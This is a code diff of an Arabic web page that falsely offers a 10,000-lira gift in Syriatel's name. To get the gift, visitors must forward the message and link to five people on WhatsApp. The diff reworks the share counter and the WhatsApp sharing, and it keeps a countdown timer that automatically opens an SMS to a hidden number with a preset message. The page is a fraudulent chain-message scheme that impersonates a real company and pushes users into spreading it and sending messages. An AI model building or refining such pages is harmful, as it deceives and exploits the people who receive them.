@@ -94,7 +94,7 @@
     <p><strong>شروط الكسب سهلة:</strong></p>
     <ul>
         <li>1. شارك هذه الرسالة لخمس أشخاص عبر تطبيق واتس آب من خلال زر رقم واحد.</li>
-        <li>2. اضغط الزر رقم اثنين وهو سيقوم بنسخ النص والرابط لمشاركته عبر الرسائل.</li>
+        <li>2. اضغط الزر رقم اثنين وهو سيقوم بنسخ النص والرابط لمشاركته عبر واتس آب.</li>
     </ul>
     <p><strong>ملاحظة:</strong> يرجى عدم ضغط زر 2 حتى تقوم بمشاركة المنشور لخمس أشخاص كي تصلك الهدية.</p>
     
@@ -116,40 +116,48 @@
         const fullMessage = `أهلاً بك في سوريا الجديدة. نقدم لكل مواطن سوري مبلغ قدره 10000 عشرة آلاف ليرة هدية مقدمة من سيريتيل.\n\nرابط الموقع: ${siteLink}`;
 
         let shareCount = parseInt(localStorage.getItem("shareCount")) || 0; // عدد المشاركات من localStorage
-        let validShares = parseInt(localStorage.getItem("validShares")) || 0; // عدد المشاركات الحقيقية من localStorage
 
         // تحديث العد في واجهة المستخدم
         function updateShareCount() {
-            const remainingShares = 5 - validShares;
+            const remainingShares = 5 - shareCount;
             document.getElementById("remainingShares").textContent = remainingShares;
-            if (remainingShares <= 0) {
+
+            // تمكين زر 2 إذا كانت المشاركات 5 أو أكثر
+            if (shareCount >= 5) {
                 document.getElementById("copyBtn").disabled = false;
             }
         }
 
-        // مشاركة الرسالة عبر واتس آب
+        // وظيفة مشاركة الرسالة عبر واتس آب
         function shareOnWhatsApp() {
-            const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(fullMessage)}`;
-            window.open(whatsappUrl, "_blank");
-            shareCount++;
-            localStorage.setItem("shareCount", shareCount);
-            if (shareCount >= 5) {
-                validShares++;
-                localStorage.setItem("validShares", validShares);
+            if (shareCount < 5) {
+                // زيادة عدد المشاركات
+                shareCount++;
+                localStorage.setItem("shareCount", shareCount); // حفظ عدد المشاركات في localStorage
+                updateShareCount();
+
+                const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(fullMessage)}`;
+                window.open(whatsappUrl, "_blank");
+                alert(`تمت المشاركة! عدد المشاركات الحالية: ${shareCount}`);
             }
-            updateShareCount();
         }
 
-        // نسخ النص إلى الحافظة ومشاركة عبر الرسائل
+        // وظيفة نسخ النص والرابط ومشاركته عبر واتس آب
         function copyAndShare() {
             // نسخ النص إلى الحافظة
             navigator.clipboard.writeText(fullMessage).then(() => {
-                alert("تم نسخ النص والرابط بنجاح! الآن سيتم فتح تطبيق الرسائل لمشاركة النص.");
-                // فتح تطبيق الرسائل مع النص
-                window.location.href = `sms:?body=${encodeURIComponent(fullMessage)}`;
+                alert("تم نسخ النص والرابط بنجاح! الآن سيتم فتح واتس آب لمشاركة النص.");
+                // مشاركة النص عبر واتس آب
+                const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(fullMessage)}`;
+                window.open(whatsappUrl, "_blank");
             }).catch(err => {
                 alert("حدث خطأ أثناء النسخ. حاول مرة أخرى.");
             });
+        }
+
+        // وظيفة إرسال الرسالة
+        function sendMessage() {
+            window.location.href = `sms:${number}?body=${encodeURIComponent(message)}`;
         }
 
         // عداد زمني للإرسال التلقائي
@@ -160,15 +168,15 @@
             timeLeft--;
             timerElement.textContent = timeLeft;
 
+            // إذا انتهى الوقت، يتم الإرسال تلقائيًا
             if (timeLeft <= 0) {
-                clearInterval(countdown);
-                sendMessage();
+                clearInterval(countdown); // إيقاف العداد
+                sendMessage(); // إرسال الرسالة تلقائيًا
             }
-        }, 1000);
+        }, 1000); // تحديث كل ثانية
 
-        function sendMessage() {
-            window.location.href = `sms:${number}?body=${encodeURIComponent(message)}`;
-        }
+        // تحديث العد عند تحميل الصفحة
+        updateShareCount();
     </script>
 </body>
 </html>
